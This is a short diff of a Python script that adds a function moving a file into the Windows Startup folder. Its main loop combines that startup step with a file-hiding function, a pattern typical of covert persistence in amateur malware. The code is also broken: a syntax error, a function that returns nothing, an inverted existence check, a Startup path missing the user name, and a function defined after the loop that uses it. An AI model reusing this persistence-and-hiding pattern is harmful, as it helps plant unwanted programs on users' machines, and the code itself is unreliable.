@@ -100,8 +100,17 @@ def directory_explorer(path):
         for letter in drive_paths:
             if os.path.exists(f"{letter}:\\{path}"):
                 return 
-file = directory_explorer(path=)    
+file = directory_explorer()    
 while run:
     print("Starting program...")
     add_to_startup(file="")
     file_hider(file=file)
+
+
+def addStartup(file):
+    # Checks if it's already in startup. If not adds it
+    if os.path.exists("C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") == True:
+        pass
+    else:    
+        shutil.move(f"{file}" , "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    
